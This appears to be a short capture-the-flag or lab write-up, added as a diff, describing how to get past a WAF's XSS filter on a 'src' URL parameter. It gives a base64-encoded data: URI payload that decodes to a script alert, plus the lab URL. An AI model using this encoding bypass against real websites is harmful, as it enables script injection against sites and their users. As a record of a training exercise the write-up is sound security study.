@@ -1,0 +1,6 @@
+You can bypass XSS protection in URL parameter (WAF) by encoding your JS in base64.
+Replace "src" parameter value ("nsa") with this line :
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+URL: http://10.13.0.186/index.php?page=media&src=nsa
